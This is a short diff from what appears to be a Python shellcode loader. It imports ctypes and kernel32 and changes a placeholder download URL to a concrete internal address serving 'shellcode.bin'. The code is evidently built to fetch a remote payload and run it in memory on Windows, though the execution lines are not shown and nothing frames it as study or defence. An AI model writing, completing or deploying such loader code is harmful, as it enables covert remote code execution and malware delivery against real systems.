@@ -3,7 +3,7 @@ from urllib import request
 import base64
 import ctypes
 
-URL = 'http://192.168.1.xxx:xxxx/shellcode.bin'
+URL = 'http://192.168.1.145:8100/shellcode.bin'
 
 kernel32 = ctypes.windll.kernel32
 
